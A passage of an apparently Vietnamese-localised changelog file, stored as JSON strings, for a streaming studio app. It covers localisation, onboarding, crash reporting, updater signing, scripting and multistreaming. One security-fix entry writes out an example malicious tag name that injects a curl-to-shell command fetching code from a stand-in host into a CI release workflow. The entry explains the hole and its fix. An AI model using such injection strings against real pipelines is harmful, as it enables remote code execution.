lỗi dưới đây lẽ ra đã lọt vào bản 1.0.0 và đáng được nêu tên, vì cả hai đều vô hình khi duyệt mã và giờ cả hai đều được một lint hoặc một bài kiểm thử thực thi thay vì dựa vào trí nhớ. Giao diện sáng mới chỉ được sửa một nửa — chế độ tối trông hoàn hảo dù một bề mặt có phần ghi đè cho giao diện sáng hay không, nên các điều khiển trắng-trên-nền-trắng lần nào cũng qua được khâu duyệt mã. Và việc nâng cấp từ 0.95.1 lẽ ra sẽ chạy lại trình hướng dẫn lần đầu, mà mẫu khởi đầu của nó thả thêm một nguồn chụp màn hình thứ hai vào cảnh mà một người dùng hiện có đã sắp xếp xong.","changelog.245328562168":"<strong>Studio nói được 18 ngôn ngữ</strong> (TASK-902) — <code>ar de en es fr hi id it ja ko nl pl pt-BR ru tr uk vi zh-CN</code>, từ một danh mục Fluent gồm <strong>989 khóa</strong>. Bản cài mới đi theo ngôn ngữ của hệ điều hành; một lựa chọn tường minh sẽ được ưu tiên. Tiếng Ả Rập bật <code>&lt;html dir=&quot;rtl&quot;&gt;</code>. Tiếng Anh được xếp lớp bên dưới mọi ngôn ngữ, nên một khóa mà người dịch chưa tới sẽ hiển thị bằng tiếng Anh thay vì dưới dạng một id thô. <code>npm run i18n:lint</code> làm CI thất bại khi có khóa bị thiếu, khóa mồ côi, khóa trùng lặp hoặc một <code>t(&quot;…&quot;)</code> không trỏ tới gì.","changelog.c9eb7215afcc":"Một lint đối chiếu chứng minh rằng 18 danh mục khớp <em>với nhau</em>; nó không nói gì về việc các chuỗi của ứng dụng có nằm trong đó hay không. Ba cổng kiểm tra nữa lấp khoảng trống đó: một bài kiểm thử rằng mọi mục của một bảng nhãn đều phân giải được, một lượt quét tìm các khóa không được gì tham chiếu, và một lượt quét tìm <code>t()</code> được gọi ở phạm vi module — thứ sẽ đóng băng một chuỗi ở ngôn ngữ đã được tải lúc import và không bao giờ dịch lại nó.","changelog.060a09e005da":"<strong>Trình hướng dẫn lần đầu cấu hình đúng chiếc máy mà nó thực sự đang chạy</strong> (TASK-903, TASK-905). Nó liệt kê các GPU và nhân vật lý, xếp hạng các bộ mã hóa phần cứng hiện có, và đề xuất bộ mã hóa, khung vẽ, fps và bitrate <em>kèm lý do được nêu bằng ngôn ngữ của người dùng</em>. Một bộ mã hóa mà driver đã từ chối sẽ bị bỏ qua thay vì được đề xuất. Chấp nhận chỉ cần một cú nhấp; giữ nguyên cài đặt của bạn cũng vậy. Bỏ qua được tính là đã hoàn tất — trình hướng dẫn không bao giờ quay lại.","changelog.62ba4a6d41af":"<strong>Bảng lệnh</strong> trên <code>Ctrl</code>/<code>Cmd</code>+<code>K</code> (TASK-904), khớp theo dãy con, nên <code>ssc</code> tìm thấy “Start Screen Capture”.","changelog.925da222cab8":"<strong>Một hộp thoại Cài đặt duy nhất và một trang Giới thiệu</strong> (TASK-906, TASK-907) — ngôn ngữ, giao diện và dock thống kê ở một nơi; phiên bản, siêu dữ liệu bản dựng, giấy phép và trình báo lỗi ở nơi còn lại.","changelog.bece666d04b9":"<strong>Giao diện sáng và giao diện tùy chỉnh.</strong> Màu nhấn là một thuộc tính tùy biến CSS được kiểm tra hợp lệ theo dạng <code>#rrggbb</code> ở cả hai phía của ranh giới IPC, vì một chuỗi được ghi vào stylesheet là một điểm có thể bị chèn mã.","changelog.dd70fb65720c":"<strong>Studio giờ điều hướng được mà không cần chuột hay màn hình</strong> (TASK-901). Mỗi điểm dừng bàn phím đều vẽ một vòng focus hiển thị rõ; hộp thoại giữ <code>Tab</code> ở bên trong và trả focus về đúng chỗ đã lấy; <code>aria-modal</code> giờ được bảo đảm bằng một cơ chế giữ focus thật thay vì một lời hứa. Việc lên sóng, ghi hình, kết nối lại và mất một giây video do rớt khung hình được thông báo cho trình đọc màn hình qua một vùng <code>aria-live</code>. Tùy chọn “giảm chuyển động” của hệ điều hành được tôn trọng.","changelog.ff6f0dc97e11":"<strong>Nâng cấp không còn chạy lại trình hướng dẫn lần đầu.</strong> <code>completedOnboarding</code> là trường mới, và một khóa bị thiếu mặc định là <code>false</code>, nên mọi bản cài hiện có lẽ ra đã được chào đón bằng một trình hướng dẫn mà mẫu khởi đầu của nó thêm một nguồn chụp màn hình <em>thứ hai</em> lên trên cảnh người dùng đã sắp xếp xong. Tệp cài đặt giờ được chuyển đổi khi tải: một tệp có từ trước khi có trường này nhưng đã chấp nhận EULA thì rõ ràng đã từng được chạy. Điều kiện dựa trên việc trường <em>vắng mặt</em>, chứ không phải mang giá trị falsy — người thoát giữa chừng trình hướng dẫn đã cố ý ghi <code>false</code> và phải thấy lại nó.","changelog.5cf1579964ec":"<strong>Giao diện sáng không còn hiển thị trắng-trên-nền-trắng.</strong> Các bảng được vẽ bằng màu <em>trắng</em> bán trong suốt trên nền gần đen, và một biến CSS không thể chạm vào bên trong một lớp tiện ích <code>bg-white/10</code>, nên giao diện sáng tô lại các tên lớp đó bằng màu đen bán trong suốt. Sáu chỗ đã bị bỏ sót: các chip tắt tiếng/cổng của bàn trộn, huy hiệu REC, rãnh của thanh tiến trình tải xuống, các chip trạng thái, chấm “đã kết thúc” của dock thống kê, và đường kẻ của khối trích dẫn EULA. <code>npm run theme:lint</code> giờ làm CI thất bại với bất kỳ lớp tiện ích trắng-alpha nào không có phần ghi đè cho giao diện sáng và không có mục trong danh sách cho phép giải thích vì sao nó được giữ màu trắng.","changelog.b78b64a1e1a5":"<strong>Chọn màu nhấn không còn đẩy người dùng giao diện sáng vào bóng tối.</strong> Ô màu ép giao diện sang Tùy chỉnh để nó “hoạt động” từ bất kỳ chế độ nào, nhưng Tùy chỉnh dựa trên nền tối — chỉ một lần chỉnh màu là âm thầm loại bỏ giao diện Sáng. Thay vào đó, ô màu bị vô hiệu hóa khi không ở chế độ Tùy chỉnh.","changelog.7d0190596194":"<strong>Trình đọc màn hình không còn thông báo một đợt rớt khung hình sau mỗi lần kết nối lại.</strong> Số khung hình bị rớt là số cộng dồn và tiếp tục tăng trong suốt thời gian mất kết nối, nên nhịp trạng thái đầu tiên khi trở lại sóng được so với mức nền trước khi mất kết nối và thông báo toàn bộ thời gian mất kết nối như một đợt rớt mới — chồng lên các thông báo “đang kết nối lại” và “trực tiếp” mà người nghe đã nghe.","changelog.a83950358bea":"<strong>Lưu cài đặt thất bại không còn loại bỏ một cài đặt không liên quan.</strong> Bước hoàn nguyên khôi phục toàn bộ ảnh chụp cài đặt được lấy khi hộp thoại hiển thị, nên một lần lưu thất bại có thể hoàn tác một cài đặt <em>khác</em> đã được lưu thành công trong lúc đó. Thay vào đó, kho cài đặt giờ được đọc lại.","changelog.aac84f9f1108":"<strong>Bản ghi <code>.frec</code> giờ có biểu tượng riêng trong Explorer.</strong> Lược đồ <code>fileAssociations</code> của Tauri không có trường <code>icon</code> và mẫu NSIS của nó mã hóa cứng <code>DefaultIcon</code> của liên kết tệp thành tệp thực thi của ứng dụng, nên mọi bản ghi đều hiện biểu tượng của studio trong khi <code>icons/frec.ico</code> nằm không dùng đến trong thư mục cài đặt. Một hook <code>NSIS_HOOK_POSTINSTALL</code> ghi lại <code>DefaultIcon</code> của ProgId sau khi liên kết được ghi, và phát tín hiệu <code>SHCNE_ASSOCCHANGED</code> để Explorer vẽ lại mà không cần đăng xuất. <em>(Windows; tệp <code>.icns</code> trên macOS và gói MSI vẫn hiện biểu tượng ứng dụng — là các phần tiếp theo riêng.)</em> Lưu ý rằng liên kết được đăng ký bởi <strong>trình cài đặt</strong>, nên một tệp <code>.frec</code> sẽ hiện biểu tượng chung cho đến khi Freally Capture được cài đặt, thay vì chạy từ một thư mục bản dựng.","changelog.64cdb0e5fc96":"[0.95.1] — 2026-07-09 (Báo cáo sự cố, lưu trạng thái chấp nhận EULA &amp; sửa lỗi hộp thoại)","changelog.ec29332c27cd":"Sáu lỗi được phát hiện khi diễn tập quy trình báo lỗi trên phần cứng thật — hai trong số đó lẽ ra đã lọt vào bản 1.0.0 — cùng phần việc về báo cáo sự cố và trình cập nhật mà các lần diễn tập đó đòi hỏi. Giờ đây, một sự cố sẽ báo cho bạn biết nó đã xảy ra và đưa studio trở lại với báo cáo đã được mở sẵn.","changelog.a70a547d08ad":"<strong>Giờ đây một sự cố sẽ báo cho bạn biết nó đã xảy ra, và đưa studio trở lại.</strong> Một ứng dụng đang sập không thể tự hiện cửa sổ lỗi của chính nó, nên panic hook khởi chạy chính tệp thực thi đó dưới dạng một trình trợ giúp nhỏ không dùng Tauri (<code>--crash-notice &lt;pid&gt;</code>), trình này hiện một hộp thoại gốc “Freally Capture đã dừng đột ngột”, chờ tiến trình bị sự cố rời khỏi bảng tiến trình, rồi khởi chạy lại. Studio được mở lại sẽ tự động hiện báo cáo đã được làm sạch. Bước chờ là thiết yếu: khởi chạy lại khi tiến trình đã chết vẫn giữ khóa phiên bản duy nhất sẽ gộp lần khởi chạy mới vào ứng dụng đang sập và không để lại studio nào cả.","changelog.71da0a3520ee":"<strong>Chấp nhận EULA không còn tự hủy bỏ.</strong> <code>App.tsx</code> đọc cài đặt <em>và</em> trạng thái EULA khi mount, nên ảnh chụp cài đặt có từ trước lúc chấp nhận; thay đổi bất kỳ cài đặt nào trong cùng phiên đó sẽ ghi giá trị cũ <code>acceptedEulaVersion: null</code> đè lên nó và cổng EULA quay lại ở lần khởi chạy sau. Một hồ sơ được lưu trước khi chấp nhận cũng gây ra điều tương tự. <code>SettingsStore::set()</code> giờ giữ nguyên trường này và <code>accept_eula()</code> là nơi duy nhất ghi nó.","changelog.327bad332e86":"<strong>Hộp thoại bị kẹt bên trong dock của chúng.</strong> <code>backdrop-blur</code> của <code>Panel</code> khiến nó trở thành khối chứa cho <code>position: fixed</code>, nên lớp phủ của <code>PickerShell</code> tự căn giữa trong khung của dock thay vì trong cửa sổ — 16 trên 19 hộp thoại, bao gồm <em>Kiểm tra cập nhật</em>, hiển thị một phần ra ngoài màn hình với các nút không bấm tới được. <code>PickerShell</code> giờ được portal tới <code>document.body</code>.","changelog.05a8d823f564":"<strong>Báo cáo sự cố gửi qua email âm thầm không mở ra gì.</strong> Độ dài URL bị giới hạn theo số ký tự, nhưng mã hóa phần trăm làm một ký tự 3 byte phình gấp chín lần — một backtrace thật tạo ra một <code>mailto:</code> dài ~7800 ký tự, vượt giới hạn ~2048 của ShellExecute trên Windows, vốn mở một cửa sổ trống mà không báo lỗi gì. Giới hạn giờ áp dụng cho <strong>toàn bộ URL</strong> (scheme, địa chỉ, tiêu đề và nội dung cộng lại), được thực thi trên độ dài sau khi mã hóa, và việc cắt bớt không bao giờ chia đôi một chuỗi thoát. Chỉ giới hạn phần nội dung là chưa đủ: tiêu đề là văn bản do người dùng nhập, và 80 ký tự CJK mã hóa thành 720 byte, nên một báo cáo không phải tiếng Anh vẫn đạt tới ~2285 ký tự.","changelog.b0d9792ddddb":"<strong>Hai panic đồng thời hiện ra hai hộp thoại sự cố.</strong> <code>panic = &quot;abort&quot;</code> không dừng mọi thứ ngay tức khắc, nên hai luồng có thể cùng chạy hook. Giờ thông báo chỉ được khởi chạy nhiều nhất một lần cho mỗi tiến trình.","changelog.6747e7604c73":"<strong>Trình trợ giúp thông báo sự cố không đọc được pid đã khởi chạy lại ngay lập tức</strong>, lao thẳng vào chính tình trạng tranh chấp phiên bản duy nhất mà nó được tạo ra để tránh. Giờ nó chờ một khoảng thời gian cố định.","changelog.c52ec7fca94b":"<strong>Menu thả xuống vẫn mở khi bạn nhấp ra ngoài.</strong> Menu <strong>+</strong> của thanh Nguồn và cả hai menu <em>Thêm bộ lọc</em> giờ đóng lại khi nhấp ra ngoài hoặc nhấn Escape. Escape chỉ đóng thứ nằm trong cùng, nên một menu bên trong hộp thoại cần một lần nhấn để đóng menu và lần thứ hai để đóng hộp thoại.","changelog.ceb3ac683c32":"<strong>Soạn trong Gmail</strong> bên cạnh nút ứng dụng email sẵn có — https thuần, không khóa API, không có gì tự động gửi; người dùng chưa đăng nhập sẽ gặp màn hình đăng nhập của Google rồi quay lại bản nháp đã điền sẵn.","changelog.3ed3900cea6b":"<strong>Báo cáo sự cố ghi lại thời điểm xảy ra</strong>, theo đồng hồ địa phương của người dùng kèm độ lệch UTC và theo UTC. Độ lệch này có tính nhận dạng yếu và được ghi rõ là ngoại lệ có chủ đích duy nhất đối với quy tắc “không có thông tin nhận dạng cá nhân” của báo cáo; người dùng đọc chính xác nội dung trước khi gửi.","changelog.2757df14a536":"<strong>Studio kiểm tra cập nhật một lần khi khởi chạy</strong> và hiện phiên bản mới, số phiên bản và ghi chú phát hành của tệp này trong một trường chỉ đọc, với lựa chọn có/không rõ ràng. Một báo cáo sự cố đang chờ luôn được ưu tiên chiếm chỗ hộp thoại; bản cập nhật chờ tới lần khởi chạy sau. Các lần kiểm tra khi ngoại tuyến hoặc bị giới hạn tần suất sẽ im lặng. <code>latest.json</code> giờ mang phần <code>CHANGELOG.md</code> của phiên bản làm <code>notes</code> của nó.","changelog.0ceef8bf9dbd":"Bản cập nhật trên Windows giờ chạy trình hướng dẫn NSIS (<code>installMode: basicUi</code>) để trang Hoàn tất đưa ra tùy chọn <strong>Chạy Freally Capture</strong> và một ô đánh dấu tạo lối tắt trên màn hình nền, thay vì âm thầm khởi động lại. Trình cài đặt cũng mang biểu tượng của ứng dụng (<code>nsis.installerIcon</code>) thay vì biểu tượng mặc định của NSIS.","changelog.04d1725214c0":"Mục <strong>Kiểm thử</strong> trong hộp thoại báo lỗi (<em>Mô phỏng báo cáo sự cố</em>, <em>Buộc một sự cố thử</em>) và hai lệnh IPC của nó. Một nút “làm sập ứng dụng” không có lý do gì để xuất xưởng trong một studio đang phát trực tiếp; quy trình được diễn tập bằng cờ khởi chạy <code>--test-crash</code>, vốn không có nút hay lệnh nào đứng sau.","changelog.6bd81d475bf0":"<strong>Quy trình phát hành: chèn lệnh shell qua tên tag.</strong> <code>${{ github.ref_name }}</code> được nội suy thẳng vào các khối <code>run:</code>, nên GitHub ghép tag vào <em>mã nguồn</em> shell trước khi bash phân tích nó. Tên ref cấm khoảng trắng nhưng cho phép <code>&quot;</code>, <code>;</code>, <code>$</code> và dấu backtick, còn <code>${IFS}</code> cung cấp khoảng trắng — một tag như <code>v1&quot;;curl${IFS}evil|sh;&quot;</code> sẽ được thực thi. Tag giờ tới script qua <code>env:</code>, dưới dạng dữ liệu. Khai thác lỗi này cần quyền đẩy tag, nên đây là biện pháp phòng thủ nhiều lớp.","changelog.81cccf7322b4":"<code>actions/checkout</code> của tác vụ phát hành giờ đặt <code>persist-credentials: false</code>. Tác vụ này giữ quyền <code>contents: write</code> và chỉ đọc <code>CHANGELOG.md</code>; để <code>GITHUB_TOKEN</code> lại trong <code>.git/config</code> sẽ trao cho bất kỳ lỗ hổng chèn mã nào trong tương lai một con đường sẵn có để đẩy mã.","changelog.25ca7c7f85dd":"<code>PRIVACY.md</code> giờ nói rõ rằng việc kiểm tra cập nhật chạy <strong>một lần mỗi lần khởi chạy</strong> thay vì chỉ khi được yêu cầu, và rằng nó không gửi gì về người dùng — cách diễn đạt trước đây nói mọi yêu cầu mạng đều “do thao tác của bạn khởi tạo”, điều mà bước kiểm tra khi khởi động mới đã khiến không còn đúng.","changelog.46a767ffc1f9":"[0.95.0] — 2026-07-08 (Ghi trò chơi, phân phối &amp; âm thanh theo từng ứng dụng — Giai đoạn 8)","changelog.599aa55a76f0":"Tự động cập nhật tự lưu trữ có chữ ký, ghi âm thanh theo từng ứng dụng, một điểm nối cho môi trường chạy NDI, một điểm nối ghi trò chơi cảnh báo trung thực về rủi ro chống gian lận, một cổng EULA ở lần chạy đầu tiên, và video trong luồng phát cho nội dung phản ứng/bình luận — phần bề mặt “hướng tới 1.0.0” của Giai đoạn 8, tất cả đều chạy cục bộ và tắt theo mặc định.","changelog.5903d686ccbb":"Đã thêm — Giai đoạn 8","changelog.eb682bb7ec7d":"<strong>Trình tự động cập nhật tự lưu trữ có chữ ký</strong> (TASK-803) — ứng dụng kiểm tra một tệp <code>latest.json</code> có chữ ký trên endpoint bản phát hành của GitHub và xác minh mọi tệp tải xuống bằng một khóa công khai minisign được nhúng vào tệp nhị phân trước khi áp dụng (gói không có chữ ký hoặc bị can thiệp sẽ bị từ chối). <strong>⭳ Kiểm tra cập nhật…</strong> trong dock Điều khiển — không có gì được tải xuống nếu bạn chưa nhấp; ứng dụng khởi động lại để hoàn tất. Quy trình phát hành ký từng tạo phẩm và soạn <code>latest.json</code>; Developer-ID + công chứng (notarization) của macOS đã được nối dây và chờ các secret (nâng cấp chứng chỉ trả phí, không cần đổi workflow). Xem <code>design/updater-signing.md</code>.","changelog.883b1ffbdb75":"<strong>Ghi âm thanh theo từng ứng dụng</strong> (TASK-805) — ghi âm thanh của một ứng dụng thành một nguồn riêng trong bàn trộn. Ưu tiên Windows qua WASAPI <strong>process loopback</strong> (<code>ActivateAudioInterfaceAsync</code> trên thiết bị ảo process-loopback, Win10 2004+); phần <code>unsafe</code> của COM được cô lập trong crate mới <code>fcap-appaudio</code> để <code>fcap-audio</code> vẫn giữ <code>#![forbid(unsafe_code)]</code>. Nguồn này có một dải kênh bàn trộn đầy đủ (VU, fader, tắt tiếng, giám sát, bộ lọc, rãnh). Linux/macOS hiện hướng dẫn trung thực cho từng hệ điều hành. Nguồn ▸ <strong>Âm thanh ứng dụng</strong>.","changelog.56b6b2b908a6":"<strong>Điểm nối Chụp Trò chơi + cảnh báo trung thực về chống gian lận/phần mềm diệt virus</strong> (TASK-801) — “Chụp Trò chơi” (chèn một hook DX/GL/Vulkan) là một <strong>cột mốc được gắn cờ</strong>, phải chủ động bật: ứng dụng không bao giờ chèn âm thầm và hiện rõ <strong>rủi ro bị cấm</strong> do chống gian lận + rủi ro với phần mềm diệt virus trước bất kỳ hook nào. Con đường dùng được hiện nay — <strong>Chụp Cửa sổ</strong> (không viền/cửa sổ) — được đề xuất cho từng hệ điều hành (Wayland → portal). Nguồn ▸ <strong>Chụp Trò chơi (đọc trước)</strong>.","changelog.ec03a805ba49":"<strong>Điểm nối cho môi trường chạy NDI</strong> (TASK-804) — đầu ra NDI tùy chọn phát hiện một môi trường chạy NDI do người dùng tự cài (không bao giờ đóng gói kèm) qua các biến môi trường đã được tài liệu hóa + các thư mục mặc định, rồi thăm dò liên kết với nó; cờ đầu ra có kiểu chỉ được bật khi phát hiện thành công. Phần gửi khung hình liên kết với các header SDK NDI miễn phí (phần tiếp theo đã được nêu tên). Hiển thị chỉ đọc trong Thành phần ▸ <strong>Tích hợp tùy chọn</strong>.","changelog.eaa0871281d1":"<strong>Cổng chấp nhận EULA ở lần chạy đầu tiên</strong> — studio không hiển thị cho đến khi phiên bản EULA hiện tại được chấp nhận (cuộn để đọc, rồi <strong>Tôi Đồng ý</strong> / <strong>Từ chối &amp; Thoát</strong>); việc chấp nhận được lưu lại và chỉ hỏi lại khi phiên bản EULA thay đổi. <code>EULA.md</code> được nhúng lúc build nên văn bản được chấp nhận chính là văn bản được phát hành.","changelog.52426b69775a":"<strong>Video trong luồng phát (phản ứng/bình luận)</strong> — nhúng một video vào cảnh và <strong>tạm dừng/tiếp tục nó trực tiếp</strong> trong khi bạn nói đè lên, rồi gỡ nó đi — âm thanh của nguồn Media tạm dừng và tiếp tục trong bản trộn cùng với hình ảnh (⏸/▶ trên các nguồn media).","changelog.082d1c8d5bec":"<strong>Tải thành phần ngay trong ứng dụng</strong> — bản tải ffmpeg theo yêu cầu giờ hiện rõ phần trăm kiểu <code>98.35%</code> bên cạnh thanh tiến trình + nút hủy. Một thành phần mới <strong>Môi trường chạy Nguồn trình duyệt (Chromium/CEF)</strong> tải môi trường chạy CEF ~100 MB theo cùng cách trung thực: nó xác định bản dựng ổn định mới nhất từ chỉ mục bản dựng CEF chính thức, <strong>xác minh tệp tải xuống bằng SHA-1 của chỉ mục đó trước khi giải nén</strong> (không đóng gói kèm, không mã hóa cứng hash), và lưu đệm theo từng người dùng — với cùng giao diện %/thanh tiến trình/hủy. <em>Nguồn</em> trình duyệt hiển thị qua môi trường chạy này là một cột mốc tiếp theo riêng; bản này phát hành phần tải môi trường chạy.","changelog.1dc8ae2f6900":"Phạm vi được nêu trung thực (Giai đoạn 8)","changelog.158788627266":"<strong>VST2/3</strong> (TASK-804) — hoãn lại sau một cờ: SDK VST2 không còn được Steinberg cấp phép và VST3 là GPLv3-hoặc-độc-quyền, cả hai đều xung đột với một bản dựng $0/không cần giấy phép bổ sung. Bộ lọc DSP tự sở hữu (khử ồn, cổng nhiễu, bộ nén, bộ giới hạn, EQ, khuếch đại, ducking) là phương án thay thế đã được phát hành.","changelog.c436d24d7e3a":"<strong>Chèn hook GPU cho ghi trò chơi</strong> và <strong>gửi khung hình NDI</strong> là các cột mốc tiếp theo đã được nêu tên, và các điểm nối ở trên đã ổn định để phục vụ chúng.","changelog.8843550dc6eb":"[0.90.0] — 2026-07-08 (Điều khiển từ xa, script &amp; plugin — bề mặt mở rộng)","changelog.a7f6a66abff0":"Điều khiển studio từ một Stream Deck, phản ứng với việc lên sóng bằng một script, nhúng một dock chat, và mở rộng ứng dụng bằng một plugin — bề mặt mở rộng của Giai đoạn 7, tất cả đều <strong>cục bộ và tắt theo mặc định</strong>.","changelog.3f14c1391b04":"Đã thêm — khả năng mở rộng (Giai đoạn 7)","changelog.cc7d3cbcb365":"<strong>API điều khiển từ xa qua WebSocket</strong> (TASK-701) — một WebSocket bảo vệ bằng mật khẩu để bộ điều khiển kiểu Stream Deck / Companion kết nối vào: chuyển cảnh, chạy hiệu ứng chuyển cảnh, bắt đầu/dừng phát và ghi hình, lưu phát lại, đặt tắt tiếng/âm lượng — đúng những thao tác như giao diện, không hơn (nó không thể đọc tệp). <strong>Tắt theo mặc định</strong>; gắn với <code>127.0.0.1</code> trừ khi LAN được bật tường minh; tắt nghĩa là cổng đã đóng. Xác thực theo kiểu thách thức–phản hồi — mật khẩu không bao giờ đi qua đường truyền. Cài đặt → Điều khiển → <strong>⌁ Điều khiển từ xa…</strong>.","changelog.155aa02952b7":"<strong>Dock trình duyệt</strong> (TASK-702) — mở cửa sổ chat bật ra, trang cảnh báo hoặc các nút web của Companion thành cửa sổ riêng bên cạnh studio (chỉ http/https; dock không có quyền truy cập vào ứng dụng, nó chỉ hiển thị). Điều khiển → <strong>⧉ Dock…</strong>.","changelog.3149da08891b":"<strong>Script Lua trong hộp cát</strong> (TASK-703) — các script <code>.lua</code> phản ứng với sự kiện của studio (lên sóng, đổi cảnh, trạng thái ghi hình) và điều khiển cùng bề mặt lệnh như API điều khiển từ xa. Hộp cát <strong>không có quyền truy cập tệp hay hệ điều hành</strong> (không có <code>io</code>/<code>os</code>/<code>require</code>, và các trình nạp bytecode đều bị đóng); lỗi của script được khoanh vùng. <code>scripts/sample.lua</code> minh họa API. Điều khiển → <strong>⚡ Script…</strong>.","changelog.507908bbd502":"<strong>SDK plugin</strong> (TASK-704) — các hợp đồng <code>Source</code>/<code>Filter</code> có tài liệu + một điểm nối registry, để một crate plugin có thể thêm nguồn hoặc bộ lọc <strong>mà không động tới lõi</strong>. <code>plugins/checkerboard</code> là mẫu hoàn chỉnh; <code>design/plugin-sdk.md</code> là hướng dẫn.","changelog.5c03c1a47d1d":"<strong>Trang tham gia trên web cho khách dùng điện thoại</strong> (TASK-R3) — mã QR lời mời giờ mở <code>docs/join.html</code> trên trang Pages: phía khách của một phiên khách mời từ xa chạy trong một trình duyệt bình thường (camera + micrô, tham gia bằng cú nhấp tường minh, tự tắt tiếng theo mô hình hai cổng, kênh nói chuyện từ người dẫn + góc nhìn của người dẫn, chia sẻ màn hình ở nơi trình duyệt hỗ trợ, tự tham gia lại với thời gian chờ tăng dần) — không cần cài đặt, không CDN (PeerJS được đóng gói sẵn). Liên kết <code>freally://</code> sao chép được vẫn mở thẳng ứng dụng.","changelog.41ecc350d86a":"<strong>Bản xem trước gốc (Windows)</strong> — lần dựng bề mặt đầu tiên của luồng kết xuất giờ được tuần tự hóa với các lần commit DirectComposition của luồng giao diện dưới khóa lớp phủ (một tình trạng tranh chấp hẹp gây bản xem trước trống khi một lần đổi kích thước xảy ra đúng lúc bề mặt được tạo ra), và khung chọn gốc giờ dùng lại phép gộp kích thước chuỗi cắt của chính bộ ghép hình thay vì một bản sao tự viết (TASK-NP7).","changelog.e2d476fc460a":"<strong>Chụp Cửa sổ</strong> — bộ bơm con trỏ không còn tổng hợp các khung hình ~60 fps không được vẽ khi con trỏ di chuyển ở chỗ <em>không</em> nằm trên cửa sổ đang được ghi (một cửa sổ khác che nó, hoặc bất cứ đâu khác trên màn hình nền). Được phát hiện nhờ bộ kiểm thử trực tiếp mới chạy mỗi bài kiểm thử trong một tiến trình riêng (<code>scripts/live-capture-tests.ps1</code>, TASK-NP9), bộ này cũng tránh được tình trạng tranh chấp khi hủy WinRT/D3D vốn có thể làm sập các lượt chạy trực tiếp gồm nhiều bài kiểm thử.","changelog.d574645cb05e":"<strong>Tài liệu điều lệ</strong> — README / PRIVACY / SECURITY giờ mô tả trung thực bề mặt mạng P2P tùy chọn của khách mời từ xa (lời mời có hạn, tham gia bằng cú nhấp tường minh, media P2P DTLS-SRTP, máy chủ trung gian chỉ mang bước bắt tay, TURN tùy chọn do người dùng sở hữu, cơ chế kiểm duyệt + cấm), và <code>THIRD-PARTY-NOTICES.md</code> có thêm các mục PeerJS + qrcode-generator còn thiếu.","changelog.c173f50767b2":"<strong>Gia cố hộp cát Lua</strong> — hộp cát script giờ đóng <code>load</code>/<code>loadstring</code> của thư viện cơ sở và <code>string.dump</code>, chứ không chỉ <code>dofile</code>/<code>loadfile</code>. <code>load</code> của Lua 5.4 mặc định chấp nhận <strong>bytecode nhị phân</strong>, mà trình nạp của nó không được kiểm chứng — một đoạn bytecode được chế tác là một lối thoát khỏi VM bằng mã gốc, có thể vượt qua hoàn toàn hộp cát không-io/không-os. Được phát hiện bởi đợt rà soát bảo mật của giai đoạn này trước khi phát hành; một bài kiểm thử hồi quy khẳng định cả ba đều đã bị gỡ.","changelog.1ebe7221d5d2":"[0.85.0] — 2026-07-07 (Phát trực tiếp chuyên sâu: đa luồng / SRT / WHIP + chiều sâu cho cảnh/nguồn/bộ mã hóa)","changelog.2d315220f41f":"<strong>Khoảnh khắc kỳ diệu</strong> — phát trực tiếp lên Twitch <strong>và</strong> YouTube cùng lúc trong khi ghi một bản sao cục bộ riêng và lưu một đoạn phát lại 30 giây, với đầu ra dọc 9:16, cảnh lồng nhau và lớp phủ chat trực tiếp <strong>không bao giờ cần khóa API hay đăng nhập</strong>.","changelog.feb4e52158c8":"Đã thêm — phát trực tiếp chuyên sâu","changelog.75834546387e":"<strong>Phát đồng thời nhiều luồng</strong> (TASK-601) — phát trực tiếp tới nhiều đích cùng lúc, <strong>thẳng tới từng nền tảng</strong> (không qua máy chủ restream). Các đích có cài đặt mã hóa trùng nhau sẽ <strong>dùng chung một lượt mã hóa phần cứng</strong> (được chia ra qua <code>tee</code> của ffmpeg); cài đặt khác nhau thì mã hóa riêng. Một đích bị lỗi được tách ra thành làn tự kết nối lại của riêng nó nên không bao giờ kéo một đích đang ổn định đi xuống; dock thống kê hiển thị tình trạng + bitrate độc lập cho từng đích.","changelog.d7881741d3bc":"<strong>SRT và WHIP</strong> (TASK-602) — phát tới một điểm nhận SRT tự lưu trữ hoặc một endpoint WebRTC WHIP bên cạnh RTMP/RTMPS, có kết nối lại + theo dõi tình trạng. Khả năng hỗ trợ SRT/WHIP của ffmpeg đã cài được thăm dò trung thực khi Phát trực tiếp. Khóa phát WHIP đi trong header <code>Authorization</code>, không bao giờ nằm trong URL.","changelog.01e2ed129c31":"<strong>Bộ đệm phát lại cuộn</strong> (TASK-603) — khi được bật, một lượt mã hóa nền giữ N giây gần nhất dưới dạng các đoạn nhỏ trên đĩa (bộ nhớ + đĩa có giới hạn); một phím tắt toàn cục lưu chúng thành một tệp phát được <strong>mà không làm gián đoạn luồng phát hay bản ghi</strong>, với các cấu hình sẵn về độ dài + chất lượng.","changelog.8abd1a3e56cd":"<strong>Khung vẽ dọc / nhiều khung vẽ</strong> (TASK-604) — một khung vẽ thứ hai (ví dụ 9:16) được dựng từ bất kỳ cảnh nào ở kích thước riêng, <strong>ghi hình và phát được độc lập</strong> với khung vẽ chính; có bản xem trước trực tiếp và chỉ số fps riêng.","changelog.2c69be261f19":"Đã thêm — chiều sâu cho cảnh / nguồn / bộ lọc / bộ mã hóa","changelog.be269b309b79":"<strong>Cảnh lồng nhau, nhóm nguồn và âm thanh theo từng cảnh</strong> (TASK-605) — một cảnh được dựng như một nguồn bên trong cảnh khác (an toàn với vòng lặp); các nhóm di chuyển/hiện/ẩn cùng nhau; một thiết lập bàn trộn ghi đè theo từng cảnh để một cảnh có thể có âm thanh khác với bản trộn chung.","changelog.5c7ab998f7ed":"<strong>Gói chuyển cảnh</strong> (TASK-606) — một <strong>stinger</strong> (một video phủ lên điểm cắt), một <strong>ảnh luma-wipe tùy chỉnh</strong>, và thêm các mẫu wipe tích hợp sẵn (ngang / hình thoi / kim đồng hồ).","changelog.4d324b472fe3":"<strong>Nguồn Trình chiếu ảnh + cấu hình sẵn cho card ghi hình</strong> (TASK-607) — một tập ảnh có thứ tự chuyển vòng theo bộ hẹn giờ với hiệu ứng hòa tan chéo tùy chọn, lặp/giữ ảnh cuối và xáo trộn; các cấu hình định dạng thông dụng của Elgato/AVerMedia trong bộ chọn thiết bị video (chỉ những chế độ mà card thực sự công bố).","changelog.67f18114a372":"<strong>Bộ lọc khóa màu / khóa độ sáng + trễ kết xuất</strong> (TASK-608) — tách bỏ bất kỳ màu nào theo khoảng cách RGB (phông nền không phải màu xanh lá), tách theo độ sáng, và làm trễ video của một nguồn N ms để khớp với âm thanh.","changelog.8349cff49176":"<strong>Chiều sâu bộ mã 